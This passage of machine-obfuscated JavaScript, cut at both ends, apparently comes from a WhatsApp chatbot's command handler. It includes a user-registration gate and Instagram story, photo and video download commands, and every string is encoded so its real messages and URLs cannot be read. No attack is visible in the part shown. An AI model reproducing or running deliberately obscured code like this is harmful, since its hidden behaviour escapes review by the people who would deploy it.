W6VcSs4','dM4IW705','fmojWQS','WQbinmkIxG','WPBcMYxdTg0','WPtcSSksW7mF','WRnqrSkE','W7f9WRqCqa','W7VcSSomBa8','CM3dNSkekW','W4iZWQClWQm','i8oCrMlcIq','xmo6W7ldGCop','WOyZWQaFWQa','WOScW73cHe0','o2tdNSkxlW','W7RdRSkbche','WRhcMCkjWRfD','WR5jW7hdGWK','WRTXW4FdVGq','W5lcQmoQtsW','sKn2','qvJdS1PY','W4/dUwNcRb4','WPDRfb4m','zc/cL8kVW7e','m8ojxw0','W4C3nCojiW','W5lcT8orvaG','WQ0WgCoR','xHHoWRhcHa','W4FcHNTJCq','x8kiga','sw98v8oW','W5ddImoMWP9c','W7ZcPCkrcgK','W7FcR0zfrq','W5b2uSkGgG','WPZcUYFcVaW','hIiWWQr5','t8kcg8kIWQu','WPxcM8kKWR19','jMZdJCkvoq','W5xcOIpcQqu','w34DWR8L','CSkVANZcNW','wCo7D8kLbXFdRW','WOhcKCkAW7NdKW','aq17beG','W6bOwmkMha','W4nhWRy','W5qXWQ41WRW','p8oCxxZdMG','4OEBWRpcTXpcHq','WPBcUtBcVKW','WPP0lSkdEG','hwSGemkV','b8kKrv04','pwpcGmkpWRu','WRhcUCoaxZBcVCkrWR7dNhCJjW','WPNcV8ogF2C','lhJdJa','bCoTELZdPG','nw/dJSkkWQa','W6m8uSkkrG','EbNcIx9Z','r8kRrgyX','e8oaWQBdSWa','uKm+Bfu','WRjSiCkIwG','FhDZAqS','ad1EWRe2','lgrfWQJcTW','oCoHtq','eSosWR7dQqi','WOdcKCkzW7JcKq','W7rHq8kZ','W6hdPSktage','rCkKCge','mhZdI8kejq','c8orW7ldNmoy','WRpdM1aHuG','eGlcKI0y','FCkXW53cImkh','W7uqW6JcOhW','W4FdImk7W4Oe','WQ9QrCkSBa','W5BdSYpcUt8','W7eTW6tcVca','juzvW7Sk','bJXgWQqy','W7COr8kw','gCoKduJcNa','W6PXuCkXeq','WOtdQ3BdTvK','ggjXW6jU','W4eOW77cTXq','F1qOALy','xtykcSoO','W6yZfmkCuG','xvlcRvzM','WOZdM8oDWRiE','W6/dPSkghuK','W4xdRmkebNm','cYvei0K','WQuTW6ZcPIy','hCk2W5VdNgK','W7y7W67cT2i','W7nVwCkMfG','W6nLwCk2nG','Amo0ihNcHa','W6NcIve3uW','emkQfmoDgW','WPHNgHWz','WQjJW7VdGI4','W5H8WR4','mWRcUvW','lmoHmwO','WPfXW4FdSKy','rCktW6VcTs0','WPT1bHGo','WOZdMdpdU2K','W7vZrmkZfa','sNDWW78Q','c8o3W5VdMMO','sWxcHfr/','W6ZdO8k4fGy','WRJcUmocvJe','W498WRGdWQm','fMr9Fmo/','W4ORxmkqFq','pwpdK8kDWRG','WOn5jCkjBa','dWVcGb9y','AYLehe4','W73dOmkFf0W','WPT+auq','WRRcVSoBCum','CK9aASoF','WOzHf8kyDq','WQlcG8k7W4JdUG','yhepFqK','x8k0WPpcLmox','eSk3sLr3','ogBdJmkcWRC','WP/cPsNcTq','WOtdJaBdUxq','WPWwzSkgsW','v2uhW6HKk8kSmvLeW5FdOq','BcjQWRddSG','CMldNSkDpW','ibtdLYmM','ztyrW4NcGW','m2X6W4uK','yIFcQMRdJW','W5C8WQynCG','W6OKW6ZcTsi','WPNcOSoBAgO','gMufFK8','vK7dS1rG','W47dHfKAuW','eZjxWOeN','twrHv8o4','e0ldHWjo','W4dcHNHJya','WQ4bW77cLea','g8oMW4pdKhy','E8obi2RcHa','W6iWrmkkxG','sCohgmkZWOy','W4RcN8kMW6DK','WPdcPtBcTaC','CsZdUx7dLW','WPhcPSoGswK','e8oiWR3dTGa','kIvzkhe','rgmaWQ8G','ESkYydJcQq','bfpdGWnI','e8k3u2KC','gSoZW5ZdJg4','A3ddJh1Z','yYxcJ8kAWQm','i2LXW6i9','WPTqC8kcqa','ohJdG8kfW7e','BcvZWRtcVa'];_0x4a9b=function(){return _0x4447e9;};return _0x4a9b();}if(autoregister){if(autoregister===![])return;const _0x1f85a4={};_0x1f85a4[_0x567016(0x52c,'0$25',0x3d3,0x466,0x4ad)+_0x5db4ce(0x129,0xcb,0x1c2,'yaQ2',0x5a)+'t']=_0x592013(0xb,-0xe5,-0x13a,-0x32,'0$25')+'Y';const _0x9dad4b={};_0x9dad4b[_0x24990b(0x5f8,0x6a5,'SGxm',0x611,0x587)+_0x592013(0xb1,0x6f,-0x9a,0x11e,'RxuR')]=_0x567016(0x5b4,'o32G',0x443,0x474,0x2fa)+'y',_0x9dad4b[_0x567016(0x2f9,'bHh^',0x31b,0x44c,0x262)+_0x24990b(0x343,0x296,'Oq^^',0x2c5,0x36d)]=_0x1f85a4,_0x9dad4b[_0x592013(0x1f,-0x147,0xab,0x167,'jXUb')]=_0x24990b(0x530,0x6ca,'Oq^^',0x543,0x606)+_0x24990b(0x67a,0x614,'0$sC',0x46c,0x505);const _0x54f81b={};_0x54f81b[_0x1bdefd(0x44f,0x49d,'vfIY',0x438,0x3ae)+_0x24990b(0x4e4,0x4b0,'u[Lt',0x5f2,0x485)+'t']=_0x567016(0x37f,'0$25',0x2e0,0x38a,0x311)+_0x1bdefd(0x357,0x433,'5Tox',0x445,0x518)+_0x567016(0x6bb,'WZ2$',0x580,0x631,0x456);const _0x1a1e3d={};_0x1a1e3d[_0x24990b(0x4e9,0x57b,'2%[e',0x41c,0x4ec)+_0x567016(0x275,'5Tox',0x365,0x3c3,0x420)]=_0x592013(0x10b,0x212,0x17a,0xb5,'L23G')+_0x5db4ce(0x2cc,0x1c2,0x81,'0$sC',0xd0)+'ff',_0x1a1e3d[_0x592013(0xb7,0x4a,0x5c,-0x8,'tb&K')+_0x1bdefd(0x436,0x4e8,'*I%r',0x467,0x37c)]=_0x54f81b,_0x1a1e3d[_0x5db4ce(0x1f6,0x1a3,0x2a4,'8tM7',0xcb)]=_0x24990b(0x4dc,0x5b2,'WZ2$',0x3a7,0x4d9)+_0x567016(0x27c,'JTjt',0x2c5,0x36c,0x256);let gaklopo=[_0x9dad4b,_0x1a1e3d];if(isCmd&&!isOwner&&!isCreator&&!Ofc[_0x5db4ce(-0x30,0x12c,0x116,'7Bl3',0x28c)][_0x1bdefd(0x23a,0x389,'aGjP',0x435,0x34c)+'e']&&!isUser)return sendButMessage(from,_0x24990b(0x685,0x4a3,'JTjt',0x602,0x58b)+sender[_0x24990b(0x4b9,0x3bd,'SGxm',0x4a0,0x499)]('@')[0x77*-0x1a+0x112e+0x28c*-0x2]+(_0x592013(0x207,0x145,0x15b,0x36f,'aXzI')+_0x567016(0x3e8,'JsV1',0x549,0x680,0x609)+_0x567016(0x5ec,'o32G',0x4dc,0x3b8,0x5f1)+_0x5db4ce(-0xcb,0x87,0x3d,'q2PR',0x1fa)+_0x567016(0x4fa,'JTjt',0x517,0x3fe,0x4c4)+_0x592013(0x147,0x7e,0x12d,-0x29,'$6Wd')+_0x567016(0x432,'tb&K',0x359,0x427,0x2e8)+_0x592013(0xde,0x9,-0x57,0xc2,'V5VU')+_0x24990b(0x311,0x21a,'JsV1',0x289,0x36f)+_0x592013(0x4c,0x12f,0xce,0x67,'tb&K')+_0x5db4ce(0x2d8,0x1ef,0x197,'qv*F',0x359)+_0x5db4ce(0x68,0x19f,0x311,'o32G',0x26c)+_0x24990b(0x361,0x376,'X4DK',0x4e3,0x400)+_0x5db4ce(0xa8,0x104,-0x41,'o)0s',0x1ac)+_0x24990b(0x2bb,0x3b8,'o)0s',0x520,0x41e)+_0x567016(0x40e,'q2PR',0x465,0x56c,0x404)+_0x24990b(0x593,0x4b0,'iC8E',0x55d,0x436)+_0x5db4ce(0x15,0xb6,0x97,'!^yH',0x1c1)+_0x592013(0x1dd,0x143,0xab,0x30a,'$6Wd')+_0x5db4ce(0x236,0x245,0x1de,'tb&K',0x2f8)+_0x592013(0x27c,0x254,0x38d,0x3a9,'2%[e')+_0x1bdefd(0x512,0x3ce,'W0FY',0x277,0x436)+_0x592013(0x1af,0x2a9,0x131,0x23d,'JTjt')+_0x567016(0x28e,'0$25',0x311,0x470,0x2f6)+_0x567016(0x23f,'q2PR',0x3b3,0x3a2,0x33e)+_0x24990b(0x471,0x46f,'RxuR',0x508,0x3fe)+_0x5db4ce(0xbb,0x81,-0x80,'0$25',0x3a)+_0x5db4ce(0xd5,0x1c1,0xd8,'HHWV',0x2fd)),namabot+_0x592013(0x9d,0x12d,0x201,0xb5,'8tM7')+owner_name,gaklopo,{'quoted':Ofc,'contextInfo':{'mentionedJid':[sender]}});}switch(command){case _0x592013(0x27e,0x269,0x2a6,0x223,'8tM7')+'ry':case _0x567016(0x2e9,'7Bl3',0x434,0x366,0x3a7)+_0x5db4ce(0x21a,0x1b4,0x25c,'RxuR',0x19a):case _0x5db4ce(0x228,0x1aa,0x250,'vfIY',0x1f8)+_0x5db4ce(0x2c,0x136,0xbb,'7Bl3',0x7f)+_0x24990b(0x275,0x21d,'W0FY',0x3a4,0x391):if(!q)return reply(_0x24990b(0x753,0x725,'SGxm',0x74a,0x5e8)+_0x5db4ce(0x56,0x153,0x205,'tb&K',0x1f4)+'a?');pape=q,hx[_0x24990b(0x4dd,0x6cf,'AP5M',0x6b7,0x635)+'ry'](pape)[_0x567016(0x395,'aGjP',0x32d,0x425,0x2e7)](async _0x2860f3=>{function _0x598cdc(_0x4ff194,_0xd4b08f,_0x13adf6,_0x4614be,_0x2a014e){return _0x1bdefd(_0x4ff194-0x78,_0xd4b08f-0xd2,_0x4614be,_0x4614be-0xc2,_0x2a014e-0x52);}function _0x192c1f(_0x5580e1,_0x980a6b,_0x486923,_0x4bad72,_0x27bc50){return _0x1bdefd(_0x5580e1-0x4d,_0x5580e1- -0x565,_0x980a6b,_0x4bad72-0xcc,_0x27bc50-0xc5);}function _0x5309e0(_0x408453,_0x155093,_0x190339,_0x86d620,_0x28791e){return _0x24990b(_0x408453-0x16c,_0x155093-0x6a,_0x155093,_0x86d620-0xff,_0x86d620- -0x448);}function _0x5bfe95(_0x2f13d6,_0x35f9b1,_0xa59adf,_0x11f9b9,_0x279978){return _0x24990b(_0x2f13d6-0x67,_0x35f9b1-0x3e,_0xa59adf,_0x11f9b9-0xf9,_0x11f9b9- -0x2e5);}const _0x5f054e={'IFmsp':function(_0x3fdc29,_0x112efa){return _0x3fdc29===_0x112efa;},'IvZLg':_0x813792('AP5M',0x4a5,0x483,0x41e,0x4ae)+'Y','zqfcb':_0x192c1f(-0x17e,'RxuR',-0x2c0,-0xbd,-0x169)+_0x813792('WZ2$',0x42e,0x606,0x4a9,0x4e9),'bErNN':_0x192c1f(-0xe,'tnx*',0x6b,0x83,0xb2)+_0x813792('qv*F',0x67c,0x4f0,0x44a,0x554)+_0x5bfe95(0x43a,0x2e0,'JAaZ',0x326,0x450),'CtEoU':function(_0x673803,_0xb88153){return _0x673803&&_0xb88153;},'LiVNM':function(_0x46b37d,_0x1a223b,_0x3e7c1d,_0x13eca8,_0x4c00da,_0x1f355a){return _0x46b37d(_0x1a223b,_0x3e7c1d,_0x13eca8,_0x4c00da,_0x1f355a);},'MvhnZ':function(_0x4dbae1,_0x50df7f){return _0x4dbae1(_0x50df7f);},'xXZgx':_0x192c1f(-0xb6,'NbM]',-0x16f,-0x16a,-0xf2),'fSchj':_0x813792('vfIY',0x80e,0x861,0x5d3,0x6fe),'BeODp':_0x192c1f(0x91,'SaA0',0x9e,0x1dd,0x111),'YkxSx':function(_0x3f22e9,_0x4875f1){return _0x3f22e9!==_0x4875f1;},'lcDJY':_0x5309e0(0x11,'B0x*',0x6d,0xc7,-0xa2),'xOuOI':_0x5bfe95(0x105,0x1c2,'AP5M',0x12c,0x133),'QRdRo':_0x5309e0(0xa6,'iC8E',0xe8,0x1ab,0x173),'aHFIo':function(_0x3334d0,_0x4fcd36){return _0x3334d0(_0x4fcd36);}};function _0x813792(_0x22410c,_0x494c56,_0x349ee6,_0xf09f7d,_0x3b68be){return _0x24990b(_0x22410c-0x18d,_0x494c56-0x6f,_0x22410c,_0xf09f7d-0x144,_0x3b68be-0x13d);}for(let _0x3bbc61 of _0x2860f3[_0x192c1f(0x32,'gH[4',0xa2,-0x13e,-0x13b)+'s']){if(_0x5f054e[_0x192c1f(-0x36,'$6Wd',-0x17c,0xdd,0xd)](_0x5f054e[_0x5309e0(0x281,'Oq^^',0x8f,0x1cb,0x141)],_0x5f054e[_0x813792('lUEB',0x77c,0x6ef,0x702,0x714)])){if(_0x5f054e[_0x598cdc(0x481,0x5a5,0x596,'Oq^^',0x70c)](_0x47966e,![]))return;const _0x7ca1a6={};_0x7ca1a6[_0x5309e0(0x7f,'iC8E',0x1ca,0x59,-0x2f)+_0x598cdc(0x5cf,0x5b4,0x714,'o32G',0x51e)+'t']=_0x5f054e[_0x192c1f(-0x209,'X4DK',-0x2b2,-0x346,-0x305)];const _0x4de86a={};_0x4de86a[_0x598cdc(0x802,0x6d2,0x72f,'5Tox',0x720)+_0x813792('2%[e',0x784,0x6a7,0x642,0x62b)]=_0x5bfe95(0xdd,0x129,'lUEB',0x19c,0x25e)+'y',_0x4de86a[_0x813792('1I75',0x828,0x591,0x65c,0x6ba)+_0x5309e0(0x10,'D%bt',-0x73,0xd8,0x18a)]=_0x7ca1a6,_0x4de86a[_0x5bfe95(0x105,0x13c,'V5VU',0xc0,0x21)]=_0x5f054e[_0x5309e0(0x1b3,'i4xw',-0x70,0x50,-0x117)];const _0x4f7180={};_0x4f7180[_0x5bfe95(0x286,0xeb,'aGjP',0x22b,0x26a)+_0x813792('2%[e',0x52b,0x47b,0x500,0x528)+'t']=_0x5f054e[_0x192c1f(-0x1ee,'u[Lt',-0x1f8,-0x300,-0x8a)];const _0xe15944={};_0xe15944[_0x5bfe95(0x396,0x334,'jXUb',0x23c,0x399)+_0x5309e0(0xb6,'MS4m',-0xf0,0x1e,0x9f)]=_0x598cdc(0x3e6,0x3f8,0x288,'5Tox',0x4b0)+_0x5309e0(0x2be,'0$25',0x235,0x1a8,0x50)+'ff',_0xe15944[_0x5bfe95(0x202,0x22f,'V^DA',0xc2,0x18e)+_0x813792('WZ2$',0x645,0x3c1,0x54b,0x4e6)]=_0x4f7180,_0xe15944[_0x5bfe95(0x144,0x20a,'WoM1',0xba,-0x9c)]=_0x5f054e[_0x192c1f(-0x15f,'W0FY',-0x227,-0x166,-0x8f)];let _0x1139d7=[_0x4de86a,_0xe15944];const _0x158d99={};_0x158d99[_0x5bfe95(0x116,0xbf,'5Tox',0x12f,0x201)+_0x192c1f(0x4f,'0$25',-0xb0,-0x5a,-0xd3)+'id']=[_0x45fdb0];const _0x25a407={};_0x25a407[_0x192c1f(-0x49,'$6Wd',-0x11b,-0xe1,0xa3)+'d']=_0x453086,_0x25a407[_0x5bfe95(0x35,0x1e7,'o)0s',0xbb,0x105)+_0x5bfe95(0x5d,0x1ae,'aGjP',0xad,0x13a)+'o']=_0x158d99;if(_0x5f054e[_0x813792('iC8E',0x640,0x6f9,0x6bd,0x6a9)](_0x5e19e2,!_0x1a1f63)&&!_0x44bce2&&!_0x101104[_0x5309e0(0x97,'u[Lt',-0x121,-0x5a,-0x12b)][_0x192c1f(0x15,'0$sC',-0xef,0xf1,0xa0)+'e']&&!_0xedcda7)return _0x5f054e[_0x5309e0(0x121,'vfIY',-0x16c,-0x41,-0x75)](_0x515138,_0x4feac6,_0x5309e0(-0x143,'*I%r',-0x98,-0xe2,-0x180)+_0x5ba6ec[_0x813792('pD$Q',0x81f,0x829,0x802,0x70e)]('@')[0x1aa2*-0x1+-0xfa6+-0x3*-0xe18]+(_0x5309e0(-0x95,'tb&K',-0x27,0x41,-0xe7)+_0x5bfe95(0x19c,0x196,'vfIY',0x10a,-0x62)+_0x813792('5Tox',0x604,0x54c,0x5f9,0x4b4)+_0x5bfe95(0x21b,0x139,'yaQ2',0x199,0xf7)+_0x598cdc(0x61e,0x681,0x536,'i4xw',0x55c)+_0x192c1f(-0x1b2,'X4DK',-0x2bf,-0x145,-0x20b)+_0x192c1f(-0x4a,'1I75',0x127,-0xf6,0x82)+_0x598cdc(0x5f7,0x609,0x57c,'u[Lt',0x49b)+_0x5309e0(-0x163,'WoM1',-0x14,-0x96,0x9a)+_0x813792('o)0s',0x79b,0x838,0x676,0x742)+_0x598cdc(0x5e7,0x5bd,0x616,'aGjP',0x475)+_0x598cdc(0x4eb,0x62a,0x5d5,'q2PR',0x565)+_0x192c1f(-0x1f5,'HHWV',-0xd1,-0x8e,-0x1fc)+_0x192c1f(-0x13,'RxuR',0x70,-0x148,-0xc9)+_0x813792('gH[4',0x478,0x6e9,0x64c,0x59e)+_0x5309e0(0x9c,'JAaZ',0x184,0x97,0x1f1)+_0x598cdc(0x765,0x5f9,0x51f,'JsV1',0x499)+_0x598cdc(0x3e4,0x4e0,0x46f,'B0x*',0x4fa)+_0x598cdc(0x520,0x625,0x67d,'bHh^',0x52a)+_0x5bfe95(0x360,0x33d,'L23G',0x20e,0x275)+_0x5309e0(-0x12c,'AP5M',0x9e,0x40,-0x11c)+_0x5bfe95(0x2de,0x2b1,'NbM]',0x244,0x279)+_0x598cdc(0x729,0x5fe,0x5e2,'AP5M',0x5c7)+_0x598cdc(0x52c,0x4e5,0x4f1,'SGxm',0x5db)+_0x813792('JAaZ',0x6ef,0x5a6,0x74c,0x670)+_0x192c1f(-0xcb,'!^yH',-0x8f,0x8,-0x6c)+_0x813792('bHh^',0x758,0x6c9,0x63b,0x76a)+_0x5309e0(-0x130,'q2PR',-0xb3,-0x6b,0x79)),_0x297d78+_0x5bfe95(0x215,0x467,'HHWV',0x2f5,0x2b0)+_0x346bcd,_0x1139d7,_0x25a407);}else{if(_0x3bbc61[_0x598cdc(0x4f9,0x600,0x69e,'yaQ2',0x59f)][_0x5309e0(0xaa,'*I%r',0x12b,0x186,0xec)+_0x192c1f(0x46,'1I75',0x179,0xa1,0x8c)](_0x5f054e[_0x5309e0(0x1fc,'B0x*',0x80,0x10f,0x174)])){if(_0x5f054e[_0x5bfe95(0x10e,0x283,'o)0s',0x259,0x2d8)](_0x5f054e[_0x813792('V5VU',0x4d0,0x635,0x6b6,0x61e)],_0x5f054e[_0x813792('0$sC',0x465,0x5e3,0x4d8,0x592)]))_0x5f054e[_0x598cdc(0x5ef,0x4fd,0x44e,'q2PR',0x3db)](_0x4e2b94,_0x234137)[_0x813792('*I%r',0x4d6,0x46e,0x5c1,0x4bb)](_0x35e5b5=>{function _0x69fc63(_0x5dec65,_0x1ba5fc,_0x27786a,_0x2090d2,_0x360771){return _0x598cdc(_0x5dec65-0x165,_0x5dec65- -0x41a,_0x27786a-0x1d3,_0x27786a,_0x360771-0x2f);}function _0x1186fc(_0x4615cb,_0x433e1b,_0x579198,_0x4096ab,_0x471be5){return _0x5309e0(_0x4615cb-0x7d,_0x4615cb,_0x579198-0xf9,_0x579198- -0x191,_0x471be5-0x49);}const _0x4d3b6b={};_0x4d3b6b[_0x1186fc('gH[4',-0x2e6,-0x1e9,-0x2cc,-0x26c)+'s']=0xc8,_0x4d3b6b[_0x1186fc('5Tox',0x4a,-0x108,-0x184,-0x176)]=_0x35e5b5[-0x1295+0x18cc*0x1+-0x637][_0x1186fc('tb&K',-0x120,-0xd0,-0x1df,-0x199)];function _0x51639b(_0x1b4eb6,_0x20068f,_0x6e7ccb,_0xea913,_0xd1ad79){return _0x192c1f(_0x1b4eb6-0x22b,_0x20068f,_0x6e7ccb-0x107,_0xea913-0x16e,_0xd1ad79-0x1d7);}function _0x175bad(_0x274e5c,_0x1c0a54,_0x269752,_0x225518,_0xff8780){return _0x5309e0(_0x274e5c-0x55,_0x269752,_0x269752-0xfd,_0x1c0a54-0x166,_0xff8780-0x5d);}_0x5f054e[_0x51639b(0x224,'u[Lt',0x28d,0x2a8,0x2ae)](_0x3c9243,_0x4d3b6b);})[_0x192c1f(-0x1e5,'lUEB',-0x32f,-0x280,-0x13e)](_0x6f89cd);else{let _0x464e68=await _0x5f054e[_0x598cdc(0x69e,0x630,0x5f8,'u[Lt',0x5a4)](getBuffer,_0x3bbc61[_0x5309e0(0x112,'MS4m',-0x22,-0x23,-0x16f)]);Zeeone[_0x192c1f(-0x72,'V^DA',-0x1cd,-0x18c,-0x1b3)+_0x5bfe95(0x235,0x73,'SaA0',0xf6,0xb6)+'e'](from,_0x464e68,video,{'thumbnail':Buffer[_0x598cdc(0x3ec,0x51f,0x3d8,'qv*F',0x5ac)](0x22d5+-0x365+-0x1*0x1f70),'quoted':Ofc,'caption':_0x813792('aGjP',0x734,0x5bf,0x696,0x5e7)+_0x5309e0(0x1cd,'WoM1',0x2d8,0x180,0x217)+'•\x20'+_0x3bbc61[_0x5bfe95(0xeb,0x143,'q2PR',0x1f0,0x176)]});}}else{if(_0x5f054e[_0x813792('aGjP',0x485,0x501,0x572,0x5c9)](_0x5f054e[_0x5bfe95(-0x41,0xf4,'tb&K',0xf3,0x7a)],_0x5f054e[_0x598cdc(0x41b,0x40d,0x29c,'5Tox',0x4d8)])){let _0x5000ab=await _0x5f054e[_0x813792('NbM]',0x415,0x436,0x53d,0x535)](getBuffer,_0x3bbc61[_0x598cdc(0x3c6,0x470,0x3ab,'1I75',0x312)]);Zeeone[_0x5bfe95(0x24c,0x75,'o32G',0x1bd,0x1ab)+_0x192c1f(-0x144,'jXUb',0x8,-0x241,-0x11)+'e'](from,_0x5000ab,image,{'thumbnail':Buffer[_0x192c1f(-0x12c,'0$25',-0x28d,-0x1fa,-0x126)](0x1*-0x1e1d+-0xdd*0xe+0x27*0x115),'quoted':Ofc,'caption':_0x813792('gH[4',0x699,0x634,0x835,0x73a)+_0x5309e0(-0x1e3,'pD$Q',-0x153,-0x9b,-0x1f)+'•\x20'+_0x3bbc61[_0x598cdc(0x573,0x594,0x51b,'Oq^^',0x6ea)]});}else{const _0x51f99f={};_0x51f99f[_0x5bfe95(0x1d2,0x471,'*I%r',0x329,0x3b0)+'s']=0xc8,_0x51f99f[_0x192c1f(-0x16f,'*I%r',-0x279,-0xf1,-0x168)]=_0x5d3f36[0x12b8*0x2+0x1ac1+-0x4031][_0x192c1f(0x53,'WoM1',0x8b,0xfc,0x154)],_0x5f054e[_0x598cdc(0x3cb,0x528,0x419,'7Bl3',0x571)](_0x293967,_0x51f99f);}}}}})[_0x5db4ce(0x189,0x293,0x3c7,'1I75',0x3b2)](_0x40f941=>reply(_0x592013(0x180,0x4b,0x85,0x222,'$6Wd')+_0x592013(0x18c,0x27d,0x7c,0x174,'JTjt')+_0x5db4ce(0xd3,0x1b0,0x1e9,'jXUb',0x16e)+_0x5db4ce(0xf2,0xe1,0xfe,'yd#j',0x1e)+_0x5db4ce(0x1a8,0x131,0x172,'JTjt',0x213)+_0x567016(0x3a4,'o32G',0x4e3,0x499,0x4f7)+_0x1bdefd(0x42e,0x324,'8tM7',0x338,0x3a7)+_0x24990b(0x458,0x398,'aGjP',0x599,0x46e)+_0x567016(0x53b,'o32G',0x57d,0x622,0x54c)));break;case'ig':case _0x24990b(0x556,0x55e,'AP5M',0x52a,0x4c2):case _0x5db4ce(0x36e,0x24c,0x234,'B0x*',0x149)+'to':case _0x1bdefd(0x379,0x4c7,'bHh^',0x5e1,0x385)+_0x1bdefd(0x32e,0x3da,'W0FY',0x373,0x45d):case _0x592013(0x290,0x388,0x236,0x134,'q2PR')+_0x5db4ce(0x281,0x1f9,0x1ed,'yaQ2',0x1a6):case _0x592013(0x12a,0x1ff,0x282,0x7e,'vfIY')+'o':case _0x592013(0x175,0x20f,0x4f,0x19d,'JTjt')+'eo':case _0x5db4ce(0x78,0xe9,0x14e,'5Tox',0x1cf)+_0x592013(0x21c,0x312,0x25d,0x148,'bHh^'):case _0x567016(0x3ee,'JsV1',0x53d,0x621,0x554)+_0x24990b(0x28d,0x2b4,'WZ2$',0x3cc,0x3cf):case _0x592013(0x274,0x367,0x2f3,0x231,'jXUb')+'ls':case _0x24990b(0x4b4,0x420,'!^yH',0x332,0x3b5)+_0x592013(0x13a,-0x2e,0xf9,0xd0,'JTjt'):case _0x24990b(0x61b,0x48a,'0$sC',0x672,0x595)+_0x567016(0x57a,'8tM7',0x565,0x5ba,0x4be):case _0x567016(0x270,'$6Wd',0x3c4,0x3d0,0x41e):case _0x1bdefd(0x6a4,0x538,'MS4m',0x5ce,0x614)+'tv':if(!isUrl(args[0xfd4+0xcae+0xb2*-0x29])&&!args[-0x58a+-0x16de+0x1c68][_0x567016(0x351,'SaA0',0x459,0x302,0x517)+_0x1bdefd(0x5ce,0x473,'WZ2$',0x5c9,0x550)](_0x1bdefd(0x51c,0x596,'JsV1',0x4bd,0x5d2)+_0x5db4ce(0x334,0x285,0x17d,'NbM]',0x388)+_0x592013(0x88,0x1d4,0x176,-0xcc,'WoM1')))return reply(mess[_0x5db4ce(0x11f,0x22d,0x181,'1I75',0x247)+_0x24990b(0x30e,0x3cc,'X4DK',0x320,0x38d)]);let urlnya=q;hx[_0x567016(0x2eb,'jXUb',0x448,0x42d,0x30a)](urlnya)[_0x24990b(0x4b8,0x550,'tnx*',0x620,0x541)](async _0x2f0d54=>{function _0x3363cd(_0x561cef,_0xb7e5,_0x4ae736,_0x246654,_0x1e3b83){return _0x592013(_0x1e3b83- -0x139,_0xb7e5-0x1b7,_0x4ae736-0x185,_0x246654-0xb2,_0x246654);}function _0x546f22(_0x1a4fe8,_0x182ddc,_0x12623a,_0x5d7ace,_0x580c12){return _0x24990b(_0x1a4fe8-0xbb,_0x182ddc-0xcf,_0x12623a,_0x5d7ace-0xce,_0x5d7ace- -0x354);}function _0xc543c2(_0x3ee7a6,_0x574b91,_0x5190ec,_0x165e11,_0x2c26c1){return _0x1bdefd(_0x3ee7a6-0x7e,_0x2c26c1- -0x38d,_0x165e11,_0x165e11-0x20,_0x2c26c1-0x4);}function _0x36f9f4(_0x3aaf63,_0x5b57fe,_0x49f07d,_0x18a911,_0x13e716){return _0x592013(_0x3aaf63-0x24c,_0x5b57fe-0x1cc,_0x49f07d-0x37,_0x18a911-0x92,_0x49f07d);}const _0x1071cd={'GALpA':function(_0x5ef226,_0x5265b1){return _0x5ef226*_0x5265b1;},'AmfQw':function(_0x5e9803,_0x5726bb){return _0x5e9803(_0x5726bb);},'BHENJ':function(_0x8bc8f9,_0x2e80a5){return _0x8bc8f9(_0x2e80a5);},'PlPNN':function(_0x5d612a,_0x3b5e34,_0x26ff75){return _0x5d612a(_0x3b5e34,_0x26ff75);},'WcAmH':_0x3440a5(-0x9a,0x6b,-0x15,-0x24,'i4xw')+_0x3440a5(0xcf,0xe5,0x1ba,0x163,'NbM]')+_0x3440a5(-0x104,0x4c,0x5d,-0x3c,'*I%r')+_0x3363cd(0x99,0xeb,-0x44,'L23G',-0x4c)+_0xc543c2(0x1b9,0x158,0x25,'7Bl3',0x184)+_0x36f9f4(0x264,0x2b8,'RxuR',0x39e,0x3ac)+_0x36f9f4(0x3fa,0x49c,'yaQ2',0x2b4,0x364)+_0x3440a5(-0x9f,0x7b,0xb8,0x6c,'SaA0')+_0xc543c2(0x1a1,0xff,0xe1,'q2PR',0x1fe)+'1','ojszG':_0x36f9f4(0x377,0x24e,'gH[4',0x206,0x240)+_0x546f22(0x2dd,0x1d1,'D%bt',0x1c7,0xa5)+_0x546f22(0xbd,0x22a,'W0FY',0xbc,-0x3d),'ukmpH':_0x3363cd(-0xe,0x8b,-0x108,'V^DA',-0x6d)+_0x36f9f4(0x2b6,0x309,'iC8E',0x36a,0x2b8),'IWNqK':_0xc543c2(0x22c,0x13d,0x210,'q2PR',0xc4),'EoNXT':_0x3363cd(0x5b,0x173,0xbb,'RxuR',0x8f),'TEpqY':_0x3440a5(0xb8,0x176,-0x8a,0x120,'X4DK')+_0x3440a5(0x14e,0x1af,0x30,0x10f,'0$sC')+'n','Mgvaw':_0x3363cd(-0x186,-0xe,0x45,'1I75',-0x3a)+'a4','gXRJK':_0x36f9f4(0x43d,0x4e2,'gH[4',0x596,0x4f6)+'e','RlBtM':_0x3440a5(0x29,-0x94,-0xeb,-0xfb,'V^DA')+_0xc543c2(0x15d,0x2b4,0x1bc,'iC8E',0x1c9)+_0xc543c2(0x175,0x151,0x1a9,'L23G',0x1c8),'ErSOY':_0x3363cd(0x2bf,0x1d1,0x275,'1I75',0x16c)+_0x546f22(0x27a,0x17f,'0$25',0x155,0xc1)+_0x36f9f4(0x39c,0x457,'yd#j',0x2a9,0x3a9)+_0x36f9f4(0x2de,0x3a7,'tb&K',0x329,0x3e0)+_0x3363cd(0x32,-0x222,-0x111,'*I%r',-0xae)+'/','fnSVp':_0x3363cd(0x17a,0xd3,0x6e,'WZ2$',0x25)+'n','gmtzM':_0x36f9f4(0x28e,0x213,'u[Lt',0x175,0x372),'OAWmV':function(_0x265761,_0x1b47be){return _0x265761(_0x1b47be);},'Pjjit':function(_0x3c559c,_0x581f03,_0x67772c){return _0x3c559c(_0x581f03,_0x67772c);},'LoTKU':function(_0x5890c0,_0x8118d0){return _0x5890c0===_0x8118d0;},'frxPK':_0x3363cd(0x1a0,0x151,0x7b,'L2j]',0x4e),'BWGqn':_0xc543c2(0x49,-0x140,-0x169,'SaA0',-0x5a),'RVjFn':_0x3440a5(0x3c,0x8c,0x2d,-0xc,'Oq^^'),'lbIuf':function(_0x32e0cd,_0x4a6b71){return _0x32e0cd!==_0x4a6b71;},'QsOUF':_0x3363cd(-0x4,0x1a8,0x68,'0$sC',0x102),'icdPv':_0x36f9f4(0x29a,0x273,'8tM7',0x154,0x149),'ELQTr':function(_0x2ea303,_0xad4fb5){return _0x2ea303(_0xad4fb5);}};function _0x3440a5(_0x44c334,_0x8cda9a,_0x4a6513,_0x4afc13,_0x2d05c7){return 